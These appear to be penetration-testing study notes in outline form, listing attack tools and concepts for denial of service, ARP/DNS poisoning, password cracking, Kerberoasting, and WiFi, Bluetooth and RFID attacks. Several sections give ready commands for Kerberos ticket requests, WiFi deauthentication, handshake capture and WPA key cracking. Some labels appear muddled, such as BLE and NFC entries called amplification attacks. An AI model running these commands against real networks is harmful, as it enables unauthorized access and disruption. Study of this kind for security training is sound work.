*********************************************************************************

## Denial of Service
* Distributed Denial of Service (DDoS)
* Reflection
* Amplification
* Volumetric
   * hping3
   * smurf
* Protocol Attacks
* Application Attacks
   * slowloris

## ARP Poisoning
* ettercap
* bettercap
* dsniff
* arpspoof

## DNS Poisoning
* ettercap
* bettercap

## Password Attacks
* Hash Cracking
   * Brute Force
   * Dictionary Attack
      * Cewl (build custom wordlist)
      * John the Ripper
      * Hashcat
      * Cain and Able
      * L0phtCrack
   * Rainbow Tables
      * Ophcrack
      
 * Password Spraying
    * Hydra
    * Medussa
    * Patator
    * Spray
    * Burpsuite

* Kerberoasting
   * Allows the attackers, as valid domain users, to request a Kerberos service ticket for ANY SERVICE!
   * Attacker captures that ticket granting service (TGS) ticket from memory
      * Attacker then attempts to crack the service credential hash offline
         * JtR/Hashcat

   * Service Principal Names(SPNs)
      * Unique identifier for a Service instance
         * Format: Service Name/Machine Name@domain

## VLAN Hopping
* Switch spoofing
   * Yersinia
   
* Double Tagging
   * Inner tag = desired destination VLAN
   * Outer tag = Native VLAN
      * Switch will strip off the Outer Tag and then forward
         
Example:
```
impacket-GetUserSPNs -dc-ip 192.168.241.200 domain/username -request
```

* NTLM relay attacks
   * LLMNR/NBT-NS
   * Responder

## MAC Spoofing
* aircrack-ng
   * airmon-ng (monitor wireless network)
   * airodump-ng (Get BSSID of target device)
      * Show connect clients MAC addresses
```
airodump-ng -c [CHANNEL] --bssid [TARGET-MAC] -w psk [INTERFACE]
```
Example:
```
airodump-ng -c 6 --bssid 00:1C:DF:89:84:9F -w psk wlan0mon
```
* macchanger
* Change MAC address with ifconfig:
```
ifconfig [INTERFACE] hw ether [MAC-ADDRESS]
```

## Wireless Attacks
* General attacks
   * Jamming
   * Spoofing
   * Data corruption/modification
   
* WiFi
   * aircrack-ng
      * airmon-ng
        ```
        airmon-ng start [INTERFACE]
        ```
      * airodump-ng 
        ```
        airodump-ng wlan0mon
        ```
         * Show connect clients MAC addresses
           ```
           airodump-ng -c [CHANNEL] --bssid [TARGET-MAC] -w psk [INTERFACE]
           ```
   * Deauthentication
      * aireplay-ng
        ```
        aireplay-ng --deauth [#-DEAUTH-PACKETS] -h [CLIENT-TO-DEAUTH-MAC] -a [BSSID] [INTERFACE]
        ```
        Example:
        ```
        aireplay-ng --deauth 25 -h C0:BD:D1:24:F5:0B -a 00:1C:DF:89:84:9F wlan0mon
        ```
        
   * Capture Handshakes
      * Put wireless card into monitoring mode:
        ```
        airmon-ng -start [INTERFACE]
        ```
      * Find BSSID of target AP
        ```
        airodump-ng wlan0mon
        ```
      * Record BSSID and channel of Target AP
      * Monitor target AP
        ```
        airodump-ng -c [CHANNEL] --bssid [BSSID] -w [WRITE-TO-FILE-PATH] [INTERFACE]
        ```
        Example:
        ```
        airodump-ng -c 6 --bssid 00:1C:DF:89:84:9F -w ceh.cap wlan0mon
        ```
      * Wait for 4-way handshake or force with aireplay-ng
         * Force 4-way handshake example
           ```
           aireplay-ng -0 2 -a 00:1C:DF:89:84:9F -c [CLIENT-MAC] wlan0mon
           ```
         * Check the airodump-ng capture for 4-way handshake
      * Time to crack the WPA key
        ```
        aircrack-ng -a2 -b [BSSID] -w [WORDLIST] [CAPTURE-FILE]
        ```
        Example:
        ```
        aircrack-ng -a2 -b 00:1C:DF:89:84:9F -w ~/Documents/rockyou.txt capture.cap-01.cap
        ```
    * WPS
    * Evil Twin
       * Eavesdropping
       * Man-in-the-Middle (MitM) / On-path
       
* Bluetooth
   * BlueJacking
      * Sending messages to devices using contacts
         * Attacker creates a new contact
            * Instead of name/number, attacker saves a message in those areas
         * Scan for Bluetooth devices
         * Shares the contact
         * Target receives the message/contact with no knowledge of who sent it
         
   * BlueSnarfing
      * Attacker is able to connect to victim without auth to see contacts, email, calendars, text messages, pictures, etc
      
   * Bluetooth Low Energy (BLE) Attack | AKA Amplification Attack
      * Flaws in BLE security allows for
         * Spoofing attacks
         * MitM / On-path attacks
         
* RFID Cloning
   proxmark tools

* Amplification Attacks (NFC)
   * Based off of RFID
      * Can be cloned
      * Transmissions can be eavesdropped at up to 10meters with help from antenna
      * Signal can be jammed
      * Signal can be modified
         * Corrupted
         * Inserted
         * MitM / on-path
            * No encryption
